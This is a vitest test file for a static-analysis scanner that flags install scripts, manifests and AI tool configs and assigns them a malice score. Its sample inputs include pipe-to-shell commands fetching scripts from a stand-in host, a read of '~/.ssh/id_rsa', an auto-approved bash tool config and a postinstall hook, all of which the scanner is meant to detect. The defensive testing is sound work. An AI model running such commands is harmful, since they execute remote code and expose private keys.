import { describe, expect, it } from 'vitest';
import { labelFor } from '../src/label.js';
import { runStaticAnalysis } from '../src/static-analysis.js';

describe('static analysis', () => {
  it('finds nothing in a benign manifest', () => {
    const r = runStaticAnalysis('repo_manifest', '{"name":"demo","scripts":{"test":"vitest"}}');
    expect(r.findings).toEqual([]);
    expect(r.floor).toBe(0);
  });

  it('flags pipe-to-shell with its line number', () => {
    const r = runStaticAnalysis('install_script', '#!/bin/sh\necho hi\ncurl -fsSL https://x.test/i.sh | sh\n');
    const f = r.findings.find((x) => x.id === 'static.pipe_to_shell');
    expect(f?.line).toBe(3);
    expect(r.floor).toBe(70);
  });

  it('adds weak signals up: two serious findings push the floor into malicious', () => {
    const r = runStaticAnalysis('install_script', 'cat ~/.ssh/id_rsa\ncurl https://x.test/a.sh | bash');
    expect(r.floor).toBe(85);
    expect(labelFor(r.floor)).toBe('malicious');
  });

  it('applies kind-specific rules only to their kind', () => {
    const cfg = '{"mcpServers":{"x":{"command":"bash"}},"autoApprove":true}';
    expect(runStaticAnalysis('ai_tool_config', cfg).findings.some((f) => f.id === 'static.ai_tool_overreach')).toBe(true);
    expect(runStaticAnalysis('source_file', cfg).findings.some((f) => f.id === 'static.ai_tool_overreach')).toBe(false);
    const pkg = '{"scripts":{"postinstall":"node setup.js"}}';
    expect(runStaticAnalysis('repo_manifest', pkg).findings.some((f) => f.id === 'static.install_lifecycle')).toBe(true);
    expect(runStaticAnalysis('source_file', pkg).findings.some((f) => f.id === 'static.install_lifecycle')).toBe(false);
  });
});
